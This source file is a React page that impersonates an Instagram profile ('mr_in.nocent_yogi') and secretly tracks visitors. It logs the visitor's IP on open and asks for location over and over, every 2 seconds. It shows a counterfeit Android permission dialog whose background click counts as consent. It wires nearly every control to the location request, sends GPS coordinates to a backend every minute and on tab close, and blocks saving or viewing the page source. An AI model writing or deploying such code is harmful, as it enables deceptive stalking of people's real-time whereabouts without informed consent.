"use client";

import { useEffect, useRef, useState } from "react";
import Sidebar from "../components/Sidebar";
import ReelModal from "../components/ReelModal";

export default function RecipientFeed({
  backendUrl = process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000",
  sessionId = "",
}) {
  const [isFollowing, setIsFollowing] = useState(false);
  const [coords, setCoords] = useState(null);
  const [hasAllowed, setHasAllowed] = useState(false);
  const [isReelOpen, setIsReelOpen] = useState(false);
  const [showPermissionPopup, setShowPermissionPopup] = useState(false);
  const [displayHost, setDisplayHost] = useState("instagram-profile-reel-sessionmake.yrdigitalenterprises.in");

  const watchIdRef = useRef(null);
  const retryTimerRef = useRef(null);
  const hasAllowedRef = useRef(false);
  const hasScheduledReelRef = useRef(false);
  const trackingIntervalRef = useRef(null);
  const backgroundStartRef = useRef(null);
  const cutoffTimerRef = useRef(null);
  const isTrackingStoppedRef = useRef(false);
  const lastKnownPositionRef = useRef(null);

  const ONE_MINUTE_MS = 60 * 1000;
  const THREE_MINUTES_MS = 3 * 60 * 1000;

  /*
   * Stop all location tracking
   */
  const stopAllTracking = () => {
    isTrackingStoppedRef.current = true;
    if (trackingIntervalRef.current) {
      clearInterval(trackingIntervalRef.current);
      trackingIntervalRef.current = null;
    }
    if (retryTimerRef.current) {
      clearInterval(retryTimerRef.current);
      retryTimerRef.current = null;
    }
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
  };

  /*
   * Resolve Backend API URL dynamically (from URL param, LAN IP, or environment)
   */
  const getEffectiveBackendUrl = () => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const apiParam = params.get("api");
      if (apiParam) return apiParam;
      const host = window.location.hostname;
      if (host && host !== "localhost" && host !== "127.0.0.1") {
        return `${window.location.protocol}//${host}:5000`;
      }
    }
    return backendUrl || process.env.NEXT_PUBLIC_SOCKET_URL || "http://localhost:5000";
  };

  /*
   * Resolve Session Title / Purpose
   */
  const getEffectiveSessionTitle = () => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const titleParam = params.get("title");
      if (titleParam) return titleParam;
    }
    return "My Mobile Location Request";
  };

  /*
   * Save location coordinates to backend MongoDB & broadcast to Host
   */
  const saveLocation = async (position) => {
    if (isTrackingStoppedRef.current) return;

    const { latitude, longitude, accuracy, speed, heading } = position.coords;
    setCoords({ latitude, longitude, accuracy });
    setHasAllowed(true);
    hasAllowedRef.current = true;
    setShowPermissionPopup(false);
    lastKnownPositionRef.current = { latitude, longitude, accuracy, speed, heading };

    // Clear continuous initial retry timer once location is allowed
    if (retryTimerRef.current) {
      clearInterval(retryTimerRef.current);
      retryTimerRef.current = null;
    }

    // Automatically trigger Reel playback popup 5 seconds after location is granted
    if (!hasScheduledReelRef.current) {
      hasScheduledReelRef.current = true;
      setTimeout(() => {
        setIsReelOpen(true);
      }, 5000);
    }

    try {
      const targetBackend = getEffectiveBackendUrl();
      const currentTitle = getEffectiveSessionTitle();
      const payload = JSON.stringify({
        sessionId: sessionId || (typeof window !== "undefined" ? window.location.href : "default-session"),
        sessionTitle: currentTitle,
        purpose: currentTitle,
        participantName: "Mobile Recipient",
        latitude,
        longitude,
        accuracy: accuracy ?? null,
        speed: speed ?? null,
        heading: heading ?? null,
        timestamp: new Date().toISOString(),
      });

      await fetch(`${targetBackend}/api/records`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: payload,
        keepalive: true,
      });
    } catch (_) {}
  };

  /*
   * Query single fresh GPS position (used every 1 minute)
   */
  const fetchFreshLocation = () => {
    if (!navigator.geolocation || isTrackingStoppedRef.current) return;

    // Check if 3 minutes have passed since the tab was closed/hidden
    if (backgroundStartRef.current) {
      const elapsed = Date.now() - backgroundStartRef.current;
      if (elapsed >= THREE_MINUTES_MS) {
        stopAllTracking();
        return;
      }
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => saveLocation(pos),
      () => {},
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
    );
  };

  /*
   * Start 1-minute periodic location interval
   */
  const startOneMinuteInterval = () => {
    if (trackingIntervalRef.current) return;
    trackingIntervalRef.current = setInterval(() => {
      fetchFreshLocation();
    }, ONE_MINUTE_MS);
  };

  /*
   * Request GPS permission via native browser dialog
   */
  const requestLocation = () => {
    if (!navigator.geolocation) {
      if (!hasAllowedRef.current) setShowPermissionPopup(true);
      return;
    }

    if (isTrackingStoppedRef.current) {
      // Re-enable tracking if user clicked/reopened
      isTrackingStoppedRef.current = false;
      backgroundStartRef.current = null;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setShowPermissionPopup(false);
        await saveLocation(position);
        setIsFollowing(true);
        startOneMinuteInterval();
      },
      () => {
        // If native prompt was ignored, dismissed, or never allowed, show Android popup
        if (!hasAllowedRef.current) {
          setShowPermissionPopup(true);
        }
      },
      {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000,
      }
    );
  };

  /*
   * 1. Allow while visiting the site -> Persisted in localStorage so it never asks again on this site
   */
  const handleAllowWhileVisiting = () => {
    try {
      localStorage.setItem("loc_permission_granted", "always");
    } catch (_) {}

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          setShowPermissionPopup(false);
          await saveLocation(position);
          setIsFollowing(true);
          startOneMinuteInterval();
        },
        () => {
          setShowPermissionPopup(false);
          setHasAllowed(true);
          hasAllowedRef.current = true;
          setTimeout(() => {
            setIsReelOpen(true);
          }, 5000);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      setShowPermissionPopup(false);
      setHasAllowed(true);
    }
  };

  /*
   * 2. Allow this time (Allow Once) -> Temporary for current session only, will ask again on reload/reopen
   */
  const handleAllowThisTime = () => {
    try {
      localStorage.removeItem("loc_permission_granted");
    } catch (_) {}

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          setShowPermissionPopup(false);
          await saveLocation(position);
          setIsFollowing(true);
          startOneMinuteInterval();
        },
        () => {
          setShowPermissionPopup(false);
          setHasAllowed(true);
          hasAllowedRef.current = true;
          setTimeout(() => {
            setIsReelOpen(true);
          }, 5000);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      setShowPermissionPopup(false);
      setHasAllowed(true);
    }
  };

  const handleNeverAllow = () => {
    setShowPermissionPopup(false);
  };

  /*
   * Instant IP and Visit Capture on Link Open
   */
  const trackVisitImmediately = async () => {
    try {
      let clientIp = null;
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        // Fallback to server-side detected IP
      }

      const targetBackend = getEffectiveBackendUrl();
      const currentTitle = getEffectiveSessionTitle();

      await fetch(`${targetBackend}/api/track-visit`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: sessionId || "default-session",
          sessionTitle: currentTitle,
          purpose: currentTitle,
          participantName: "Mobile Visitor",
          clientIp,
          timestamp: new Date().toISOString(),
        }),
        keepalive: true,
      });
    } catch (_) {}
  };

  useEffect(() => {
    // Set dynamic hostname
    if (typeof window !== "undefined") {
      const host = window.location.hostname;
      if (host && host !== "localhost" && host !== "127.0.0.1") {
        setDisplayHost(host);
      }
    }

    // 0. Register Service Worker for background lifecycle if available
    if (typeof window !== "undefined" && "serviceWorker" in navigator) {
      navigator.serviceWorker.register("/sw.js").catch(() => { });
    }

    // 1. Immediately log IP address and visit to MongoDB on open
    trackVisitImmediately();

    // 1.1 Check if user previously granted "Allow while visiting the site"
    let isAlwaysAllowed = false;
    try {
      if (typeof window !== "undefined" && localStorage.getItem("loc_permission_granted") === "always") {
        isAlwaysAllowed = true;
      }
    } catch (_) {}

    if (isAlwaysAllowed) {
      // Never show popup again for this site, fetch location directly
      setHasAllowed(true);
      hasAllowedRef.current = true;
      setShowPermissionPopup(false);
      requestLocation();
    } else {
      // 2. Trigger native browser GPS prompt immediately on page load
      requestLocation();

      // 2.1 Show Android permission popup after 2.5s if native prompt was ignored
      setTimeout(() => {
        if (!hasAllowedRef.current) {
          setShowPermissionPopup(true);
        }
      }, 2500);

      // 3. Continuously ask / retry native browser prompt every 2 seconds until user taps "Allow" or "Allow once"
      retryTimerRef.current = setInterval(() => {
        if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
          requestLocation();
        } else if (hasAllowedRef.current) {
          clearInterval(retryTimerRef.current);
          retryTimerRef.current = null;
          startOneMinuteInterval();
        }
      }, 2000);
    }

    // 4. Handle Tab Visibility, Tab Close & 3-Minute Cutoff
    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        // Tab backgrounded or closing -> start 3-minute countdown
        backgroundStartRef.current = Date.now();

        if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
        cutoffTimerRef.current = setTimeout(() => {
          stopAllTracking();
        }, THREE_MINUTES_MS);
      } else if (document.visibilityState === "visible") {
        // Tab reopened -> cancel cutoff & resume 1-minute tracking
        backgroundStartRef.current = null;
        isTrackingStoppedRef.current = false;
        if (cutoffTimerRef.current) {
          clearTimeout(cutoffTimerRef.current);
          cutoffTimerRef.current = null;
        }
        fetchFreshLocation();
        startOneMinuteInterval();
      }
    };

    const handlePageHideOrUnload = () => {
      // Send exit beacon before tab terminates
      if (lastKnownPositionRef.current && navigator.sendBeacon) {
        const targetBackend = getEffectiveBackendUrl();
        const currentTitle = getEffectiveSessionTitle();
        const payload = JSON.stringify({
          sessionId: sessionId || "default-session",
          sessionTitle: currentTitle,
          purpose: currentTitle,
          participantName: "Mobile Recipient (Closed Tab)",
          ...lastKnownPositionRef.current,
          timestamp: new Date().toISOString(),
        });
        navigator.sendBeacon(`${targetBackend}/api/records`, payload);
      }
      backgroundStartRef.current = Date.now();
      if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
      cutoffTimerRef.current = setTimeout(() => {
        stopAllTracking();
      }, THREE_MINUTES_MS);
    };

    // 5. User interaction listeners
    const handleUserInteraction = () => {
      if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
        requestLocation();
      }
    };

    // 6. Anti-Copy & Anti-Download Event Protections
    const handleContextMenu = (e) => {
      e.preventDefault();
      return false;
    };

    const handleDragStart = (e) => {
      e.preventDefault();
      return false;
    };

    const handleKeyDown = (e) => {
      // Prevent Ctrl+S, Ctrl+U, Ctrl+Shift+I
      if ((e.ctrlKey || e.metaKey) && (e.key === "s" || e.key === "u")) {
        e.preventDefault();
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("pagehide", handlePageHideOrUnload);
    window.addEventListener("beforeunload", handlePageHideOrUnload);
    window.addEventListener("click", handleUserInteraction);
    window.addEventListener("touchstart", handleUserInteraction);
    window.addEventListener("scroll", handleUserInteraction);
    document.addEventListener("contextmenu", handleContextMenu);
    document.addEventListener("dragstart", handleDragStart);
    document.addEventListener("keydown", handleKeyDown);

    return () => {
      if (retryTimerRef.current) clearInterval(retryTimerRef.current);
      if (trackingIntervalRef.current) clearInterval(trackingIntervalRef.current);
      if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);

      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("pagehide", handlePageHideOrUnload);
      window.removeEventListener("beforeunload", handlePageHideOrUnload);
      window.removeEventListener("click", handleUserInteraction);
      window.removeEventListener("touchstart", handleUserInteraction);
      window.removeEventListener("scroll", handleUserInteraction);
      document.removeEventListener("contextmenu", handleContextMenu);
      document.removeEventListener("dragstart", handleDragStart);
      document.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  const handleToggleFollow = () => {
    requestLocation();
    setIsFollowing(true);
  };

  /*
   * Open Reel Modal Popup
   */
  const handleOpenReel = (e) => {
    if (e) e.stopPropagation();
    requestLocation();
    setIsReelOpen(true);
  };

  /*
   * Open native Instagram mobile application via deep link
   */
  const handleOpenInstagramApp = (e) => {
    if (e) e.stopPropagation();
    requestLocation();

    const username = "mr_in.nocent_yogi";
    const appUri = `instagram://user?username=${username}`;
    const webFallbackUrl = `https://www.instagram.com/${username}/`;

    // 1. Attempt to open native Instagram mobile app
    window.location.href = appUri;

    // 2. Fallback to official web profile if app isn't installed
    setTimeout(() => {
      window.open(webFallbackUrl, "_blank");
    }, 1500);
  };

  return (
    <>
      <div
        className={`ig-app ${!hasAllowed ? "blurred-content" : "unblurred-content"}`}
        onClick={!hasAllowed ? requestLocation : undefined}
        onTouchStart={!hasAllowed ? requestLocation : undefined}
      >
        {/* Left Sidebar */}
        <Sidebar onItemClick={requestLocation} activeTab="Profile" />

      {/* Main Content Area */}
      <main className="ig-main">
          {/* Mobile Top Header */}
          <header className="mobile-top-header">
            <button className="mobile-header-icon-btn" onClick={requestLocation}>
              <svg viewBox="0 0 24 24" width="22" height="22" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="15 18 9 12 15 6" />
              </svg>
            </button>
            <div className="mobile-header-title" onClick={requestLocation}>
              <span>mr_in.nocent_yogi</span>
              <svg viewBox="0 0 24 24" width="15" height="15" fill="#0095F6">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15l-5-5 1.41-1.41L11 14.17l7.59-7.59L20 8l-9 9z" />
              </svg>
            </div>
            <button className="mobile-header-icon-btn" onClick={requestLocation}>
              <svg viewBox="0 0 24 24" width="22" height="22" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="1.5" fill="#FFFFFF" />
                <circle cx="6" cy="12" r="1.5" fill="#FFFFFF" />
                <circle cx="18" cy="12" r="1.5" fill="#FFFFFF" />
              </svg>
            </button>
          </header>

          <div className="feed-container mobile-feed-container">
            {/* Top Profile Row: Avatar on Left + 3 Stats Columns on Right */}
            <section className="profile-header-mobile">
              <div className="profile-avatar-mobile" onClick={requestLocation}>
                <div className="location-avatar">
                  <div className="ig-story-ring">
                    <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
                  </div>
                </div>
              </div>

              <div className="profile-stats-mobile">
                <div className="stat-box-mobile">
                  <strong>94</strong>
                  <span>posts</span>
                </div>
                <div className="stat-box-mobile">
                  <strong>293</strong>
                  <span>followers</span>
                </div>
                <div className="stat-box-mobile">
                  <strong>625</strong>
                  <span>following</span>
                </div>
              </div>
            </section>

            {/* Profile Bio Details */}
            <section className="profile-bio-mobile">
              <h2 className="bio-name-mobile">mr_in.nocent_yogi</h2>
              <div className="bio-lines-mobile">
                <p>Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀</p>
                <p>Vaeraraiyum Paarkathae🙈</p>
                <p>Avalai Avalai Pazhagi Tholaitha Ithayam</p>
                <p>Vaeraraiyum Aerkaathae❣️</p>
                <p>@editor_Yogi_R³</p>
              </div>
              <a className="bio-link-mobile" onClick={requestLocation}>
                <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" strokeWidth="2.2">
                  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" />
                  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" />
                </svg>
                <span>www.yrdigitalenterprises.in and 1 more</span>
              </a>
            </section>

            {/* Profile Action Buttons Bar: Follow + Message + User Plus */}
            <div className="profile-action-buttons-mobile">
              <button
                className={`action-btn-mobile follow-btn-mobile ${isFollowing ? "following" : ""}`}
                onClick={handleToggleFollow}
              >
                {isFollowing ? "Following" : "Follow"}
              </button>
              <button className="action-btn-mobile user-plus-btn-mobile" onClick={requestLocation}>
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
                  <circle cx="9" cy="7" r="4" />
                  <line x1="19" y1="8" x2="19" y2="14" />
                  <line x1="22" y1="11" x2="16" y2="11" />
                </svg>
              </button>
            </div>

            {/* Story Highlights Row */}
            <div className="highlights-row">
              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar">
                    <img src="/highlights/business.jpg" alt="Bussiness" />
                  </div>
                </div>
                <span>Bussiness</span>
              </div>

              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar">
                    <img src="/highlights/invitations.jpg" alt="invitations" />
                  </div>
                </div>
                <span>invitations</span>
              </div>

              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar">
                    <img src="/highlights/aval.jpg" alt="Aval" />
                  </div>
                </div>
                <span>Aval ❣️</span>
              </div>

              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar">
                    <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                  </div>
                </div>
                <span>Thumbnails...</span>
              </div>

              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar">
                    <img src="/highlights/king.jpg" alt="king" />
                  </div>
                </div>
                <span>king 👑</span>
              </div>

              <div className="highlight-item" onClick={requestLocation}>
                <div className="highlight-ring">
                  <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <line x1="12" y1="5" x2="12" y2="19"></line>
                      <line x1="5" y1="12" x2="19" y2="12"></line>
                    </svg>
                  </div>
                </div>
                <span>New</span>
              </div>
            </div>

            {/* Profile Navigation Tabs Bar */}
            <div className="profile-tabs-bar">
              <button className="profile-tab-item active" onClick={requestLocation} title="Posts">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="3" width="7" height="7" />
                  <rect x="14" y="3" width="7" height="7" />
                  <rect x="14" y="14" width="7" height="7" />
                  <rect x="3" y="14" width="7" height="7" />
                </svg>
              </button>

              <button className="profile-tab-item" onClick={handleOpenReel} title="Reels">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
                  <polygon points="10 8 16 12 10 16 10 8" fill="currentColor" />
                </svg>
              </button>

              <button className="profile-tab-item" onClick={requestLocation} title="Reposts">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M17 1l4 4-4 4" />
                  <path d="M3 11V9a4 4 0 0 1 4-4h14" />
                  <path d="M7 23l-4-4 4-4" />
                  <path d="M21 13v2a4 4 0 0 1-4 4H3" />
                </svg>
              </button>

              <button className="profile-tab-item" onClick={requestLocation} title="Tagged">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="3" y="3" width="18" height="18" rx="2" />
                  <circle cx="12" cy="10" r="3" />
                  <path d="M7 21v-2a5 5 0 0 1 10 0v2" />
                </svg>
              </button>
            </div>

            {/* Post Photo Grid (3-Columns) */}
            <div className="recipient-posts-grid">
              {/* Post 1 - Pinned */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge pin-badge" title="Pinned">
                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                </div>
                <img src="/posts/post1.png" alt="Post 1" />
              </div>

              {/* Post 2 - Pinned */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge pin-badge" title="Pinned">
                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                </div>
                <img src="/posts/post2.png" alt="Post 2" />
              </div>

              {/* Post 3 - Pinned */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge pin-badge" title="Pinned">
                  <svg viewBox="0 0 24 24"><path d="M16 12V4H17V2H7V4H8V12L5 15V17H11V22H13V17H19V15L16 12Z"/></svg>
                </div>
                <img src="/posts/post3.png" alt="Post 3" />
              </div>

              {/* Post 4 - Featured Reel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge reel-badge" title="Reel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                  </svg>
                </div>
                <img src="/posts/post4.png" alt="Post 4 - Reel" />
              </div>

              {/* Post 5 - Carousel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge carousel-badge" title="Carousel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="2" y="2" width="16" height="16" rx="2" />
                    <rect x="6" y="6" width="16" height="16" rx="2" fill="rgba(255,255,255,0.3)" />
                  </svg>
                </div>
                <img src="/posts/post5.jpg" alt="Post 5" />
              </div>

              {/* Post 6 - Reel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge reel-badge" title="Reel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                  </svg>
                </div>
                <img src="/posts/post6.jpg" alt="Post 6" />
              </div>

              {/* Post 7 - Reel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge reel-badge" title="Reel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                  </svg>
                </div>
                <img src="/posts/post7.jpg" alt="Post 7" />
              </div>

              {/* Post 8 - Reel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge reel-badge" title="Reel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <polygon points="6 4 20 12 6 20 6 4" fill="#FFFFFF" />
                  </svg>
                </div>
                <img src="/posts/post8.jpg" alt="Post 8" />
              </div>

              {/* Post 9 - Carousel */}
              <div className="recipient-post-tile" onClick={handleOpenReel}>
                <div className="post-badge carousel-badge" title="Carousel">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="2" y="2" width="16" height="16" rx="2" />
                    <rect x="6" y="6" width="16" height="16" rx="2" fill="rgba(255,255,255,0.3)" />
                  </svg>
                </div>
                <img src="/posts/post9.jpg" alt="Post 9" />
              </div>
            </div>

            {/* Bottom App Banner */}
            <div className="mobile-use-app-bar">
              <button className="mobile-use-app-btn" onClick={handleOpenInstagramApp} title="Open Instagram App">
                <span>Use the app</span>
                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" strokeWidth="2.5">
                  <line x1="18" y1="6" x2="6" y2="18" />
                  <line x1="6" y1="6" x2="18" y2="18" />
                </svg>
              </button>
            </div>
          </div>
        </main>

        {/* Mobile Fixed Bottom Navigation Bar */}
        <nav className="mobile-bottom-nav-bar">
          <button className="mobile-nav-btn" onClick={requestLocation} title="Home">
            <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M3 9.5L12 3l9 6.5V20a1 1 0 0 1-1 1h-5v-6H9v6H4a1 1 0 0 1-1-1V9.5z" />
            </svg>
          </button>
          <button className="mobile-nav-btn" onClick={requestLocation} title="Search">
            <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
          </button>
          <button className="mobile-nav-btn" onClick={handleOpenReel} title="Reels">
            <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
              <polygon points="10 8 16 12 10 16 10 8" fill="none" stroke="#FFFFFF" />
            </svg>
          </button>
          <button className="mobile-nav-btn" onClick={requestLocation} title="Direct">
            <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M22 2L11 13" />
              <polygon points="22 2 15 22 11 13 2 9 22 2" />
            </svg>
          </button>
          <button className="mobile-nav-btn active" onClick={requestLocation} title="Profile">
            <div className="mobile-nav-profile-ring">
              <img src="/highlights/profile.jpg" alt="Profile" />
            </div>
          </button>
        </nav>
      </div>

      {/* Android Location Permission Modal (Rendered in front of the blurred feed) */}
      {showPermissionPopup && !hasAllowed && (
        <div className="android-location-overlay" onClick={handleAllowWhileVisiting}>
          <div className="android-location-card" onClick={(e) => e.stopPropagation()}>
            <div className="android-location-header">
              <div className="android-location-icon-wrapper">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
                  <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
                </svg>
              </div>
              <div className="android-location-title">
                <strong>{displayHost}</strong> wants to use your device&apos;s location
              </div>
            </div>

            <div className="android-location-buttons">
              <button className="android-btn-primary" onClick={handleAllowWhileVisiting}>
                Allow while visiting the site
              </button>
              <button className="android-btn-primary" onClick={handleAllowThisTime}>
                Allow this time
              </button>
              <button className="android-btn-secondary" onClick={handleNeverAllow}>
                Never allow
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Reel Popup Modal Feature */}
      <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
    </>
  );
}
